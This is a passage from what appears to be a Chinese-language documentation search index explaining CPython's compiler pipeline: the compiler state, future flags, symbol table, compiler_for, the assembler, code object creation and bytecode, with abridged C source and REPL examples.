7\uff0c\u4e0b\u4e00\u6b65\u5c31\u662f\u628aAST\u7f16\u8bd1\u4e3aCPU\u80fd\u591f\u7406\u89e3\u7684\u4e1c\u897f\uff0c\u8fd9\u5c31\u662f\u7f16\u8bd1\u3002\u7f16\u8bd1\u53ef\u4ee5\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206:\u4e00\u662f\u904d\u5386\u6811\u5e76\u521b\u5efa\u4e00\u4e2a\u63a7\u5236\u6d41\u56fe(control-flow-graph)\uff0c\u7528\u6765\u8868\u793a\u903b\u8f91\u6267\u884c\u7684\u987a\u5e8f\uff1b\u53e6\u5916\u5c31\u662f\u5c06\u63a7\u5236\u6d41\u56fe\u4e2d\u7684\u8282\u70b9\u8f6c\u6362\u4e3a\u8f83\u5c0f\u7684\u53ef\u6267\u884c\u8bed\u53e5\uff0c\u79f0\u4e3a\u5b57\u8282\u7801\u3002</p> <p>PyAST_CompileObject()\u51fd\u6570\u662f\u7f16\u8bd1\u5668\u90e8\u5206\u7684\u4e3b\u8981\u5165\u53e3\uff0c\u5b83\u4ee5Python\u6a21\u5757\u4f5c\u4e3a\u4e3b\u8981\u53c2\u6570\uff0c\u540c\u89e3\u91ca\u5668\u8fdb\u7a0b\u65e9\u671f\u521b\u5efa\u8fc7\u7684\u6587\u4ef6\u540d\u79f0\u3001\u5168\u5c40\u53d8\u91cf\u3001\u5c40\u90e8\u53d8\u91cf\u4ee5\u53caPyArena\u4e00\u8d77\u6253\u5305\u4f20\u5165\u3002\u7136\u540e\u5148\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u7684\u7f16\u8bd1\u5668\u72b6\u6001\u7ed3\u6784\u4f53\uff0c\u7528\u6765\u5b58\u50a8\u4e00\u4e9b\u5c5e\u6027\u3001\u7f16\u8bd1\u6807\u8bc6\u3001\u6808\u7b49\u7b49: cpython/Python/compile.c<pre><code>struct compiler {\n    PyObject *c_filename;\n    struct symtable *c_st;\n    PyFutureFeatures *c_future; /* pointer to module's __future__ */\n    PyCompilerFlags *c_flags;\n    int c_optimize;              /* optimization level */\n    int c_interactive;           /* true if in interactive mode */\n    int c_nestlevel;\n    int c_do_not_emit_bytecode;  \n    PyObject *c_const_cache;     /* Python dict holding all constants, including names tuple */\n    struct compiler_unit *u; /* compiler state for current block */\n    PyObject *c_stack;           /* Python list holding compiler_unit ptrs */\n    PyArena *c_arena;            /* pointer to memory allocation arena */\n};\n</code></pre> \u63a5\u7740\u670911\u4e2a\u4e3b\u8981\u6b65\u9aa4:</p> <ol> <li>\u5982\u679c\u6a21\u5757\u4e0d\u5b58\u5728<code>__doc__</code>\u5219\u521b\u5efa\u4e00\u4e2a\u65b0\u7684</li> <li>\u5982\u679c\u6a21\u5757\u4e0d\u5b58\u5728<code>__annotations__</code>\u5219\u521b\u5efa\u4e00\u4e2a\u65b0\u7684</li> <li>\u8bbe\u7f6e\u5168\u5c40\u7f16\u8bd1\u5668\u72b6\u6001\u4e2d\u7684\u6587\u4ef6\u540d\u4e3a\u4f20\u5165\u7684\u6587\u4ef6\u540d</li> <li>\u5c06\u7f16\u8bd1\u5668\u7684\u5185\u5b58\u533a\u57df\u8bbe\u7f6e\u4e3a\u89e3\u91ca\u5668\u4f7f\u7528\u7684\u90a3\u4e2a</li> <li>\u5c06\u6a21\u5757\u4e2d\u6240\u6709\u7684<code>__future__</code>\u6807\u8bc6\u590d\u5236\u81f3\u5168\u5c40\u7f16\u8bd1\u5668\u72b6\u6001\u4e2d</li> <li>\u5408\u5e76\u547d\u4ee4\u884c\u6216\u73af\u5883\u53d8\u91cf\u4e2d\u63d0\u4f9b\u7684\u8fd0\u884c\u65f6\u6807\u8bc6</li> <li>\u542f\u7528\u7f16\u8bd1\u5668\u4e2d\u6240\u6709\u7684<code>__future__</code></li> <li>\u8bbe\u7f6e\u7f16\u8bd1\u7684\u4f18\u5316\u7ea7\u522b\u4e3a\u53c2\u6570\u63d0\u4f9b\u7684\uff0c\u6216\u8005\u662f\u9ed8\u8ba4\u7684</li> <li>\u6839\u636e\u6a21\u5757\u5bf9\u8c61\u6784\u5efa\u7b26\u53f7\u8868</li> <li>\u8fd0\u884c\u7f16\u8bd1\u5668\uff0c\u8fd4\u56de\u4ee3\u7801\u5bf9\u8c61</li> <li>\u7f16\u8bd1\u5668\u91ca\u653e\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u6240\u5206\u914d\u7684\u6240\u6709\u5185\u5b58</li> </ol> <p>\u6838\u5fc3\u4ee3\u7801: <pre><code>PyCodeObject *\nPyAST_CompileObject(mod_ty mod, PyObject *filename, PyCompilerFlags *flags,\n                   int optimize, PyArena *arena)\n{\n    struct compiler c;\n    PyCodeObject *co = NULL;\n    if (!__doc__) {\n        __doc__ = PyUnicode_InternFromString(\"__doc__\");\n    }\n    if (!__annotations__) {\n        __annotations__ = PyUnicode_InternFromString(\"__annotations__\");\n    }\n    c.c_filename = filename;\n    c.c_arena = arena;\n    c.c_future = PyFuture_FromASTObject(mod, filename);\n    merged = c.c_future-&gt;ff_features | flags-&gt;cf_flags;\n    c.c_future-&gt;ff_features = merged;\n    flags-&gt;cf_flags = merged;\n    c.c_flags = flags;\n    c.c_optimize = (optimize == -1) ? config-&gt;optimization_level : optimize;\n    c.c_nestlevel = 0;\n    c.c_do_not_emit_bytecode = 0;\n    co = compiler_mod(&amp;c, mod);\n finally:\n    compiler_free(&amp;c);\n    return co;\n}\n</code></pre></p>"},{"location":"python/interpreter/#future","title":"Future\u6807\u8bc6\u548c\u7f16\u8bd1\u6807\u8bc6","text":"<p>\u7f16\u8bd1\u5668\u8fd0\u884c\u524d\uff0c\u6709\u4e24\u79cd\u6807\u8bc6\u53ef\u4ee5\u5207\u6362\u7f16\u8bd1\u5668\u5185\u90e8\u7684\u529f\u80fd\u3002</p> <p>\u7b2c\u4e00\u79cd\u662f\u901a\u8fc7\u547d\u4ee4\u884c\u6216\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u7684\u89e3\u91ca\u5668\u72b6\u6001\uff0c\u4f8b\u5982\u547d\u4ee4\u884c\u6267\u884c\u65f6\u6dfb\u52a0<code>-O</code>\u6807\u5fd7(\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u73af\u5883\u53d8\u91cfPYTHONOPTIMIZE=1\u8fbe\u5230\u540c\u6837\u6548\u679c)\uff0c\u5219\u6240\u6709\u7684\u65ad\u8a00\u8bed\u53e5\u90fd\u4f1a\u88ab\u7f16\u8bd1\u5668\u5ffd\u7565\u6389\uff0c\u8fd9\u4e9b\u65ad\u8a00\u8bed\u53e5\u5f80\u5f80\u662f\u8c03\u8bd5\u65f6\u624d\u9700\u8981\u3002</p> <p>\u53e6\u4e00\u79cd\u662f\u5b9e\u9645\u7684\u6e90\u4ee3\u7801\u4e2d\u52a0\u5165future\u8bed\u53e5\uff0c\u4f8b\u5982<code>from __future__ import annotations</code>\uff0c\u5b83\u662fPython3.7\u65b0\u52a0\u5165\u7684\uff0c\u56e0\u4e3a\u4f7f\u7528type hints\u65f6\u53ef\u80fd\u7c7b\u578b\u8fd8\u6ca1\u6709\u88ab\u521b\u5efa\uff0c\u8be5\u8bed\u53e5\u53ef\u4ee5\u8ba9\u7c7b\u578b\u6ce8\u89e3\u5ef6\u8fdf\u6c42\u503c\u3002</p>"},{"location":"python/interpreter/#_8","title":"\u7b26\u53f7\u8868","text":"<p>\u7b26\u53f7\u8868\u4e3a\u7f16\u8bd1\u5668\u63d0\u4f9b\u4e86\u4e00\u4e2a\u67e5\u627e\u5f15\u7528\u5168\u5c40\u53d8\u91cf\u3001\u5c40\u90e8\u53d8\u91cf\u7b49\u7684\u4f5c\u7528\u57df\uff0c\u5b83\u7684\u7ed3\u6784\u662f\u8fd9\u6837\u7684: <pre><code>struct symtable {\n    PyObject *st_filename;          /* name of file being compiled, decoded from the filesystem encoding */\n    struct _symtable_entry *st_cur; /* current symbol table entry */\n    struct _symtable_entry *st_top; /* symbol table entry for module */\n    PyObject *st_blocks;            /* dict: map AST node addresses to symbol table entries */\n    PyObject *st_stack;             /* list: stack of namespace info */\n    PyObject *st_global;            /* borrowed ref to st_top-&gt;ste_symbols */\n    int st_nblocks;                 /* number of blocks used. kept for consistency with the corresponding compiler structure */\n    PyObject *st_private;           /* name of current class or NULL */\n    PyFutureFeatures *st_future;    /* module's future features that affect the symbol table */\n    int recursion_depth;            /* current recursion depth */\n    int recursion_limit;            /* recursion limit */\n};\n</code></pre> \u5176\u4e2d\u7684\u4e00\u4e9bAPI\u901a\u8fc7Python\u7684\u6807\u51c6\u5e93symtable\u6a21\u5757\u53ef\u4ee5\u8c03\u7528: <pre><code>&gt;&gt;&gt; import symtable\n&gt;&gt;&gt; s = symtable.symtable('b + 1', filename='test.py', compile_type='eval')\n&gt;&gt;&gt; [symbol.__dict__ for symbol in s.get_symbols()]\n[{'_Symbol__name': 'b', '_Symbol__flags': 6160, '_Symbol__scope': 3, '_Symbol__namespaces': ()}]\n</code></pre> \u6838\u5fc3\u7684C\u4ee3\u7801\u5728PySymtable_BuildObject()\u51fd\u6570\u4e2d\uff0c\u5b83\u4e5f\u662f\u4f9d\u636e\u4f20\u5165\u7684mod_ty\u7c7b\u578b\u7684\u4e0d\u540c\u4f7f\u7528\u4e0d\u540c\u7684\u8bbf\u95ee\u51fd\u6570\uff0c\u6709symtable_visit_stmt()\u3001symtable_visit_expr()\u7b49\uff0c\u8fd9\u4e9b\u8bbf\u95ee\u51fd\u6570\u91cc\u9762\u4e5f\u662f\u4e00\u4e2a\u5de8\u957f\u7684switch\u8bed\u53e5\u5bf9\u5e94\u7740\u5b9a\u4e49\u5728Parser/Python.asdl\u4e2d\u7684\u6bcf\u79cd\u8bed\u53e5\u7c7b\u578b\u4ee5\u53ca\u5404\u81ea\u7684\u903b\u8f91\u3002\u4f8b\u5982\u5bf9\u4e8e\u4e00\u4e2a\u51fd\u6570\u5b9a\u4e49\uff0c\u5b83\u9700\u8981\u505a\u7684\u7279\u6b8a\u5904\u7406\u6709:\u68c0\u6d4b\u9012\u5f52\u6df1\u5ea6\u8d85\u8fc7\u9650\u5236\u5219\u5f15\u53d1\u5f02\u5e38\u3001\u5c06\u51fd\u6570\u540d\u79f0\u52a0\u5165\u5230\u5c40\u90e8\u53d8\u91cf\u4e2d\u3001\u89e3\u6790\u987a\u5e8f\u53c2\u6570\u548c\u5173\u952e\u5b57\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\u3001\u89e3\u6790\u53c2\u6570\u548c\u8fd4\u56de\u503c\u7684\u7c7b\u578b\u6ce8\u91ca\u3001\u89e3\u6790\u51fd\u6570\u7684\u88c5\u9970\u5668\u7b49\u7b49\u3002</p>"},{"location":"python/interpreter/#_9","title":"\u6838\u5fc3\u7f16\u8bd1\u8fc7\u7a0b","text":"<p>\u73b0\u5728PyAST_CompileObject()\u6709\u4e86\u4e00\u4e2a\u7f16\u8bd1\u5668\u72b6\u6001\u3001\u4e00\u4e2a\u7b26\u53f7\u8868\u3001\u4e00\u4e2a\u6a21\u5757\u5f62\u5f0f\u7684AST\uff0c\u771f\u6b63\u7684\u7f16\u8bd1\u624d\u5f00\u59cb\u3002\u8fd9\u4e2a\u9636\u6bb5\u7684\u76ee\u6807\u662f\u5c06state\u3001symtable\u3001AST\u8f6c\u5316\u4e3aCFG\uff0c\u4ee5\u53ca\u6355\u83b7\u903b\u8f91\u548c\u4ee3\u7801\u5f02\u5e38\u5e76\u629b\u51fa\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7Python\u63d0\u4f9b\u7684\u5185\u7f6e\u51fd\u6570compile()\u5b8c\u6210\u7f16\u8bd1\u8fc7\u7a0b\uff0c\u4f20\u5165\u7684\u662f\u8868\u8fbe\u5f0f\u5219mode\u9009\u62e9eval\uff0c\u4f20\u5165\u7c7b\u3001\u65b9\u6cd5\u3001\u6a21\u5757\u7b49mode\u8981\u9009\u62e9exec\uff0c\u5b83\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u4ee3\u7801\u5bf9\u8c61: <pre><code>In [1]: compile(\"a+1\", \"a.py\", mode=\"eval\")                     \nOut[1]: &lt;code object &lt;module&gt; at 0x1120e58a0, file \"a.py\", line 1&gt;\nIn [2]: _.co_code                      \nOut[2]: b'e\\x00d\\x00\\x17\\x00S\\x00'\n</code></pre></p> <p>\u600e\u6837\u5f97\u5230\u8fd9\u4e2a\u4ee3\u7801\u5bf9\u8c61\u7684\uff0c\u5b9e\u9645\u5c31\u662fcompiler_mod(): <pre><code>static PyCodeObject *\ncompiler_mod(struct compiler *c, mod_ty mod)\n{\n    PyCodeObject *co;\n    ...\n    switch (mod-&gt;kind) {\n    case Module_kind:\n        if (!compiler_body(c, mod-&gt;v.Module.body)) {\n            return 0;\n        }\n        break;\n    case Interactive_kind:\n        ...\n    case Expression_kind:\n        ...\n    case Suite_kind:\n        ...\n    ...\n    co = assemble(c, addNone);\n    return co;\n}\n</code></pre></p> <p>compiler_body(){:target=\"blank\"}\u5faa\u73af\u8bbf\u95ee\u6a21\u5757\u4e2d\u7684\u6bcf\u6761\u8bed\u53e5\uff0c\u548csymtable\u7684\u5de5\u4f5c\u65b9\u5f0f\u7c7b\u4f3c: <pre><code>static int\ncompiler_body(struct compiler *c, asdl_seq *stmts)\n{\n    int i = 0;\n    stmt_ty st;\n    PyObject *docstring;\n    ...\n    for (; i &lt; asdl_seq_LEN(stmts); i++)\n        VISIT(c, stmt, (stmt_ty)asdl_seq_GET(stmts, i));\n    return 1;\n}\n</code></pre> asdl_seq_GET()\u67e5\u770b\u6bcf\u4e2aAST\u8282\u70b9\u7684\u7c7b\u578b\u5f97\u5230\u8bed\u53e5\u7684\u7c7b\u578b\uff0c\u7136\u540e\u901a\u8fc7\u5b8f\uff0cVISIT\u8c03\u7528compiler_visit*\u51fd\u6570: <pre><code>#define VISIT(C, TYPE, V) {\\\n    if (!compiler_visit_ ## TYPE((C), (V))) \\\n        return 0; \\\n}\n</code></pre> \u5bf9\u4e8e\u8bed\u53e5\u7c7b\u578b\u6765\u8bf4\uff0c\u5c31\u662f\u5230compiler_visit_stmt()\u51fd\u6570\uff0c\u7136\u540e\u5177\u4f53\u6bcf\u6761\u8bed\u53e5\u4e5f\u6709\u81ea\u5df1\u7684\u7f16\u8bd1\u51fd\u6570: <pre><code>static int\ncompiler_visit_stmt(struct compiler *c, stmt_ty s)\n{\n    Py_ssize_t i, n;\n    /* Always assign a lineno to the next instruction for a stmt. */\n    c-&gt;u-&gt;u_lineno = s-&gt;lineno;\n    c-&gt;u-&gt;u_col_offset = s-&gt;col_offset;\n    c-&gt;u-&gt;u_lineno_set = 0;\n    switch (s-&gt;kind) {\n    case FunctionDef_kind:\n        return compiler_function(c, s, 0);\n    case ClassDef_kind:\n        return compiler_class(c, s);\n    ...\n    case For_kind:\n        return compiler_for(c, s);\n    ...\n    }\n    return 1;\n}\n</code></pre></p> <p>\u6211\u4eec\u4ee5for\u8bed\u53e5\u4e3a\u4f8b: <pre><code>for i in iterable:\n    # block\nelse:  # optional if iterable is False\n    # block\n</code></pre> \u5bf9\u4e8e\u4e00\u4e2aFor\u7c7b\u578b\u7684\u8bed\u53e5\uff0c\u5b83\u4f1a\u8c03\u7528compiler_for()\u3002\u6240\u6709\u7684\u8bed\u53e5\u548c\u8868\u8fbe\u5f0f\u7c7b\u578b\u90fd\u6709\u76f8\u5e94\u7684compiler_*()\u51fd\u6570\uff0c\u5927\u591a\u6570\u7c7b\u578b\u76f4\u63a5\u5728\u5176\u4e2d\u521b\u5efa\u5b57\u8282\u7801\uff0c\u4e5f\u6709\u4e9b\u6bd4\u8f83\u590d\u6742\u7684\u8bed\u53e5\u7c7b\u578b\u8fd8\u4f1a\u8c03\u7528\u5176\u4ed6\u51fd\u6570\u3002\u8bb8\u591a\u8bed\u53e5\u90fd\u53ef\u80fd\u4f1a\u6709\u5b50\u53e5\uff0cfor\u5faa\u73af\u5728\u8d4b\u503c\u548c\u8fed\u4ee3\u65f6\u4e5f\u53ef\u80fd\u9047\u5230\u590d\u6742\u7684\u8868\u8fbe\u5f0f\u3002compiler_for()\u5c06blocks\u53d1\u9001\u7ed9\u7f16\u8bd1\u5668\u72b6\u6001\uff0c\u8fd9\u4e9bblocks\u5305\u542b\u6307\u4ee4(\u6307\u4ee4\u5bf9\u5e94\u7740opcode)\uff0c\u53c2\u6570\uff0c\u76ee\u6807block(\u5982\u679c\u662f\u8df3\u8f6c\u6307\u4ee4)\uff0c\u4ee5\u53ca\u884c\u53f7: <pre><code>typedef struct basicblock_ {\n    struct basicblock_ *b_list; //\u6307\u5411\u7f16\u8bd1\u5668\u72b6\u6001\u7684block\u5217\u8868\n    int b_iused;                // \u5df2\u7ecf\u4f7f\u7528\u7684\u6307\u4ee4\u6570\u7ec4\u7684\u5bb9\u91cf\n    int b_ialloc;               // \u5206\u914d\u7ed9\u6307\u4ee4\u6570\u7ec4\u7684\u5bb9\u91cf\n    struct instr *b_instr;      // \u6307\u5411\u6307\u4ee4\u6570\u7ec4\n    struct basicblock_ *b_next; // \u6307\u5411\u4e0b\u4e00\u4e2ablock\n    unsigned b_seen : 1;        // \u5f53\u7f16\u8bd1\u5668\u6df1\u5ea6\u4f18\u5148\u904d\u5386\u65f6\uff0c\u662f\u5426\u5df2\u770b\u5230\u8be5block\n    unsigned b_return : 1;      // \u5982\u679c\u8be5block\u6709\u8fd4\u56de\u503c\n    int b_startdepth;           // \u8be5block\u7684\u6808\u6df1\u5ea6\n    int b_offset;               // \u6c47\u7f16\u7a0b\u5e8f\u7684\u6307\u4ee4\u504f\u79fb\u91cf\n} basicblock;\n</code></pre> \u5bf9\u4e8eFor\u7c7b\u578b\u8bed\u53e5\u7684\u89e3\u6790\uff0c\u7f16\u8bd1\u5668\u8fdb\u884c\u4e8615\u6b65\u64cd\u4f5c: <pre><code>static int\ncompiler_for(struct compiler *c, stmt_ty s)\n{\n    basicblock *start, *cleanup, *end;\n    start = compiler_new_block(c);                       // 1.\u521b\u5efastart\u4ee3\u7801\u5757\uff0c\u5206\u914d\u5185\u5b58\u5e76\u521b\u5efa\u4e00\u4e2abasicblock\u6307\u9488\n    cleanup = compiler_new_block(c);                     // 2.\u521b\u5efacleanup\u4ee3\u7801\u5757\n    end = compiler_new_block(c);                         // 3.\u521b\u5efaend\u4ee3\u7801\u5757\n    if (start == NULL || end == NULL || cleanup == NULL)\n        return 0;\n    if (!compiler_push_fblock(c, FOR_LOOP, start, end))  // 4.\u5c06frame block\u538b\u6808\uff0c\u7c7b\u578b\u662fFOR_LOOP\uff0c\u5165\u53e3block\u662fstart\uff0c\u9000\u51fablock\u662fend\n        return 0;\n    VISIT(c, expr, s-&gt;v.For.iter);                       // 5.\u8bbf\u95ee\u8fed\u4ee3\u5668\u8868\u8fbe\u5f0f\uff0c\u8be5\u8868\u8fbe\u5f0f\u5bf9\u8fed\u4ee3\u5668\u6dfb\u52a0\u64cd\u4f5c\n    ADDOP(c, GET_ITER);                                  // 6.\u5c06GET_ITER\u64cd\u4f5c\u6dfb\u52a0\u5230\u7f16\u8bd1\u5668\u72b6\u6001\n    compiler_use_next_block(c, start);                   // 7.\u5207\u56destart\u5757\n    ADDOP_JREL(c, FOR_ITER, cleanup);                    // 8.\u8c03\u7528compiler_addop_j()\u4f7f\u7528cleanup\u5757\u7684\u53c2\u6570\u6dfb\u52a0FOR_ITER\u64cd\u4f5c\n    VISIT(c, expr, s-&gt;v.For.target);                     // 9.\u8bbf\u95ee\u76ee\u6807\u5e76\u5c06\u7279\u6b8a\u4ee3\u7801(\u5982\u5143\u7ec4\u89e3\u5305)\u6dfb\u52a0\u81f3start\u5757\n    VISIT_SEQ(c, stmt, s-&gt;v.For.body);                   // 10.\u8bbf\u95eefor\u5faa\u73af\u4e3b\u4f53\u4e2d\u7684\u6bcf\u6761\u8bed\u53e5\n    ADDOP_JABS(c, JUMP_ABSOLUTE, start);                 // 11.\u8c03\u7528compiler_addop_j()\u6dfb\u52a0JUMP_ABSOLUTE\u64cd\u4f5c\uff0c\u4e3a\u4e86\u5faa\u73af\u4f53\u6267\u884c\u5b8c\u8df3\u56de\u5faa\u73af\u5f00\u59cb\u7684\u5730\u65b9\n    compiler_use_next_block(c, cleanup);                 // 12.\u79fb\u81f3cleanup\u5757\n    compiler_pop_fblock(c, FOR_LOOP, start);             // 13.\u5c06FOR_LOOP\u8fd9\u4e2aframe block\u5f39\u51fa\u6808\n    VISIT_SEQ(c, stmt, s-&gt;v.For.orelse);                 // 14.\u8bbf\u95eefor\u5faa\u73af\u7684else\u4e2d\u7684\u8bed\u53e5\u90e8\u5206\n    compiler_use_next_block(c, end);                     // 15.\u4f7f\u7528end block\n    return 1;\n}\n</code></pre></p> <p>\u5f53\u8fd9\u4e00\u6b65\u6267\u884c\u5b8c\uff0c\u7f16\u8bd1\u5668\u5c31\u6709\u4e86\u4e00\u7ec4frame block\uff0c\u5176\u4e2d\u7684\u6bcf\u4e00\u4e2a\u90fd\u5305\u542b\u4e00\u7ec4\u6307\u4ee4\u4ee5\u53ca\u6307\u5411\u4e0b\u4e00\u4e2ablock\u7684\u6307\u9488\u3002</p>"},{"location":"python/interpreter/#_10","title":"\u6c47\u7f16\u5668","text":"<p>\u901a\u8fc7\u7f16\u8bd1\u5668\u72b6\u6001\uff0c\u6c47\u7f16\u5668\u5bf9block\u8fdb\u884c\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\uff0c\u5e76\u628a\u5b83\u4eec\u7684\u6307\u4ee4\u5408\u5e76\u4e3a\u4e00\u4e2a\u5b57\u8282\u7801\u5e8f\u5217\u3002\u6838\u5fc3\u65b9\u6cd5assemble()\u7684\u4e3b\u8981\u4efb\u52a1\u6709: * \u8ba1\u7b97\u51fa\u6709\u591a\u5c11\u4e2ablock\uff0c\u4ee5\u4fbf\u4e8e\u5206\u914d\u5185\u5b58 * \u786e\u4fdd\u6240\u6709\u6700\u540e\u7684block\u90fd\u8fd4\u56deNone\uff0c\u8fd9\u4e5f\u662f\u6bcf\u4e2a\u65b9\u6cd5\u90fd\u8fd4\u56deNone\u4e0d\u7ba1\u5b83\u6709\u6ca1\u6709return\u8bed\u53e5\u7684\u539f\u56e0 * \u89e3\u51b3\u6240\u6709\u7684\u6807\u8bb0\u4e3a\u76f8\u5bf9\u8df3\u8f6c\u8bed\u53e5\u7684\u504f\u79fb\u91cf * \u8c03\u7528dfs()\u65b9\u6cd5\u53bb\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u6267\u884cblock * \u628a\u6240\u6709\u7684\u6307\u4ee4\u63d0\u4ea4\u7ed9\u7f16\u8bd1\u5668 * \u8c03\u7528makecode()\u65b9\u6cd5\u5e76\u4f20\u5165\u7f16\u8bd1\u5668\u72b6\u6001\uff0c\u7528\u6765\u751f\u6210PyCodeObject</p> <p>dfs()\u65b9\u6cd5\u662f\u901a\u8fc7\u6bcf\u4e00\u4e2ablock\u7684b_next\u6307\u9488\u8fdb\u884c\u6df1\u5ea6\u4f18\u5148\u904d\u5386\u7684\uff0c\u904d\u5386\u8fc7\u7684\u4f1a\u6807\u8bb0\u8be5block\u7684b_seen\uff0c\u7136\u540e\u6309\u76f8\u53cd\u7684\u987a\u5e8f\u628a\u5b83\u4eec\u6dfb\u52a0\u81f3\u6c47\u7f16\u5668\u7684**a_postorder\u5217\u8868\u4e2d\u3002</p>"},{"location":"python/interpreter/#_11","title":"\u521b\u5efa\u4ee3\u7801\u5bf9\u8c61","text":"<p>makecode()\u65b9\u6cd5\u901a\u8fc7\u7f16\u8bd1\u5668\u72b6\u6001\u3001\u4e00\u4e9b\u6c47\u7f16\u5668\u7684\u5c5e\u6027\uff0c\u7136\u540e\u8c03\u7528PyCode_New()\u628a\u5b83\u4eec\u653e\u5728\u4e00\u4e2aPyCodeObject\u4e2d: <pre><code>static PyCodeObject *\nmakecode(struct compiler *c, struct assembler *a)\n{\n...\n    consts = consts_dict_keys_inorder(c-&gt;u-&gt;u_consts);\n    names = dict_keys_inorder(c-&gt;u-&gt;u_names, 0);\n    varnames = dict_keys_inorder(c-&gt;u-&gt;u_varnames, 0);\n...\n    cellvars = dict_keys_inorder(c-&gt;u-&gt;u_cellvars, 0);\n...\n    freevars = dict_keys_inorder(c-&gt;u-&gt;u_freevars, PyTuple_GET_SIZE(cellvars));\n...\n    flags = compute_code_flags(c);\n    if (flags &lt; 0)\n        goto error;\n    bytecode = PyCode_Optimize(a-&gt;a_bytecode, consts, names, a-&gt;a_lnotab);\n...\n    co = PyCode_NewWithPosOnlyArgs(posonlyargcount+posorkeywordargcount,\n                                   posonlyargcount, kwonlyargcount, nlocals_int, \n                                   maxdepth, flags, bytecode, consts, names,\n                                   varnames, freevars, cellvars, c-&gt;c_filename,\n                                   c-&gt;u-&gt;u_name, c-&gt;u-&gt;u_firstlineno, a-&gt;a_lnotab);\n...\n    return co;\n}\n</code></pre> \u53d8\u91cf\u540d\u79f0\u3001\u5e38\u91cf\u7b49\u90fd\u662fcode\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u6b64\u5916PyCode_Optimize()\u65b9\u6cd5\u8fd8\u5bf9\u5b57\u8282\u7801\u8fdb\u884c\u4e86\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4f18\u5316\uff0c\u8fd9\u4e2a\u4f18\u5316\u5668\u53eb\u7aa5\u5b54\u4f18\u5316\u5668\uff0c\u88ab\u653e\u5728\u4e00\u4e2a\u4e13\u95e8\u7684<code>Python/peephole.c</code>\u4e2d\uff0c\u5b83\u4f1a\u4ed4\u7ec6\u68c0\u67e5\u6bcf\u6761\u6307\u4ee4\uff0c\u5e76\u5728\u5408\u9002\u7684\u60c5\u51b5\u4e0b\u5c06\u90e8\u5206\u6307\u4ee4\u66ff\u6362\u4e3a\u5176\u4ed6\u6307\u4ee4\u3002\u4f8b\u5982\u5176\u4e2d\u6709\u4e00\u9879\u4f18\u5316\u53eb\u5e38\u91cf\u5c55\u5f00\uff0c\u5b83\u80fd\u628a\u8bed\u53e5<code>a = 1 + 5</code>\u4f18\u5316\u4e3a<code>a = 6</code>\u3002</p>"},{"location":"python/interpreter/#_12","title":"\u5b57\u8282\u7801","text":"<p>\u5b57\u8282\u7801\u88ab\u5b58\u50a8\u5728\u4ee3\u7801\u5bf9\u8c61(\u5373<code>__code__</code>)\u7684<code>co_code</code>\u4e2d\uff0c\u4ee5\u4e00\u4e2a\u51fd\u6570\u4e3a\u4f8b: <pre><code>&gt;&gt;&gt; def add(x, y):                                                                                          \n...     z = x + y\n...     return z\n\n&gt;&gt;&gt; \" \".join(str(b) for b in add.__code__.co_code)\n'124 0 124 1 23 0 125 2 124 2 83 0'\n</code></pre> \u5b57\u8282\u7801\u4e2d\u6bcf\u4e24\u4e2a\u6570\u5b57\u4e3a\u4e00\u7ec4\uff0c\u7b2c\u4e00\u4e2a\u4e3a\u6307\u4ee4\uff0c\u7b2c\u4e8c\u4e2a\u4e3a\u53c2\u6570\uff0c\u6307\u4ee4\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u6570\u53ef\u4ee5\u5728CPython\u6e90\u7801\u4e2d\u627e\u5230: cpython/Include/opcode.h<pre><code>#define BINARY_ADD               23\n#define RETURN_VALUE             83\n#define LOAD_FAST               124\n#define STORE_FAST              125\n</code></pre> \u8fd9\u5c31\u53ef\u4ee5\u548cdis\u7684\u8f93\u51fa\u7ed3\u679c\u5bf9\u5e94\u8d77\u6765: <pre><code>&gt;&gt;&gt; dis.dis(add)\n&lt;!-- \u6e90\u7801\u884c    \u504f\u79fb\u91cf \u6307\u4ee4           \u53c2\u6570(\u76ee\u6807\u5bf9\u8c61)  --&gt;\n  2           0 LOAD_FAST                0 (x)\n              2 LOAD_FAST                1 (y)\n              4 BINARY_ADD\n              6 STORE_FAST               2 (z)\n\n  3           8 LOAD_FAST                2 (z)\n             10 RETURN_VALUE\n</code></pre> \u6307\u4ee4\u6240\u5bf9\u5e94\u7684\u6e90\u7801\u884c\u8fd9\u4e2a\u4fe1\u606f\u5176\u5b9e\u4fdd\u5b58\u5728\u4ee3\u7801\u5bf9\u8c61\u7684\u4e24\u4e2a\u76f8\u5173\u5c5e\u6027\u4e2d\uff0c<code>co_firstlineno</code>\u7528\u6765\u5b58\u50a8\u8be5\u6bb5\u4ee3\u7801\u8d77\u59cb\u7684\u884c\u53f7\uff0c<code>co_lnotab</code>\u7531\u6bcf\u4e24\u4e2a\u6570\u5b57\u4e00\u7ec4\u7ec4\u6210\uff0c\u524d\u4e00\u4e2a\u4e3a\u5b57\u8282\u7801\u504f\u79fb\u7684\u4f4d\u7f6e\uff0c\u540e\u4e00\u4e2a\u4e3a\u76f8\u5bf9\u524d\u4e00\u7ec4\u884c\u53f7\u7684\u589e\u91cf\u3002\u6bcf\u6761\u5b57\u8282\u7801\u6307\u4ee4\u4ee3\u8868\u7684\u610f\u4e49\u53ef\u901a\u8fc7\u5b98\u65b9\u6587\u6863\u6b64\u5904\u67e5\u8be2\u5230\u3002</p>"},{"location":"python/interpreter/#_13","title":"\u6267\u884c","text":"<p>\u6267\u884c\u7684\u5165\u53e3\u662f\u5728<code>Python/pythonrun.c</code>\u7684run_eval_code_obj()\u51fd\u6570\u4e2d\uff0c\u5b83\u9700\u8981\u4e00\u4e2acode\u5bf9\u8c61\uff0c\u4e0d\u7ba1\u662f\u4ece.pyc\u6587\u4ef6\u4e2d\u6765\u7684\u8fd8\u662f\u4e00\u6b65\u6b65\u7f16\u8bd1\u6765\u7684\u3002\u7136\u540e\u8be5\u51fd\u6570\u5c06globals\u3001locals\u3001PyArena\u548c\u7f16\u8bd1\u597d\u7684PyCodeObject\u4f20\u7ed9PyEv